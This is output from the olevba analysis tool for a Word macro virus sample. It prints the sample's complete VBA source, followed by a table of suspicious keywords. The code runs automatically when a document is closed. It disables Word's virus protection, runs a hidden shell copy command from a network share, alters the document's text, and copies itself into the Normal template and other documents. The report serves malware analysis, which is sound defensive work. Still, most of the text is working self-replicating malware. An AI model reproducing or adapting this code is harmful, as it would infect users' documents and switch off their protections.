olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dx2-2c0ffc1a04e7b9f5ccbeac1f8550d7ec5f950f0b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dx2-2c0ffc1a04e7b9f5ccbeac1f8550d7ec5f950f0b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next
    Application.ScreenUpdating = False
    ActiveWindow.WindowState = wdWindowStateMinimize

Const Kuku = "Black Wednesday!"

'Declare Variables
Dim SaveDoc, SaveNormalTempl, DocInfected, NormalTemplInfected As Boolean
Dim ActDoc, NormTempl As Object
Dim MyCod, UserAddress, LogData, LogFile As String
Dim a1, FileLocal, FileServer As Integer

'Initialize Variables
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTempl = NormalTemplate.VBProject.VBComponents.Item(1)

DocInfected = ActDoc.CodeModule.Find(Kuku, 1, 1, 10000, 10000)
NormalTemplInfected = NormTempl.CodeModule.Find(Kuku, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .FileName = "NetSetup.log"
    FileLocal = .Execute
End With
With fs
    .LookIn = "\\post\temp\1000"
    .FileName = "NetSetup.log"
    FileServer = .Execute
End With
    
If FileServer > 0 Then
    If (FileLocal <= 0) Then
        Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
    Else
        If FileLen("\\post\temp\1000\NetSetup.log") <> FileLen("c:\NetSetup.log") Then
            Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
        End If
    End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "c:\NetSetup.log"

'If (WeekDay(Now()) = vbWednesday) Then
    Selection.MoveDown Unit:=wdLine, Count:=20, Extend:=wdExtend
    Selection.Range.Case = wdNextCase
    ActiveDocument.Save
'End If
'Make sure that some conditions are true before we continue infecting anything
If (DocInfected = True Xor NormalTemplInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocInfected = True Then
  
    SaveNormalTempl = NormalTemplate.Saved
  
    MyCod = ActDoc.CodeModule.Lines(1, ActDoc.CodeModule.CountOfLines)

    a1 = NormTempl.CodeModule.CountOfLines
    NormTempl.CodeModule.DeleteLines 1, a1
    NormTempl.CodeModule.AddFromString MyCod
    
    If SaveNormalTempl = True Then NormalTemplate.Save
    
  End If
              
  'Infect the ActiveDocument
  If NormalTemplInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDoc = ActiveDocument.Saved
    
    OurCode = NormTempl.CodeModule.Lines(1, NormTempl.CodeModule.CountOfLines)

    a1 = ActDoc.CodeModule.CountOfLines
    ActDoc.CodeModule.DeleteLines 1, a1
    ActDoc.CodeModule.AddFromString OurCode
    
    If SaveDoc = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub













+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

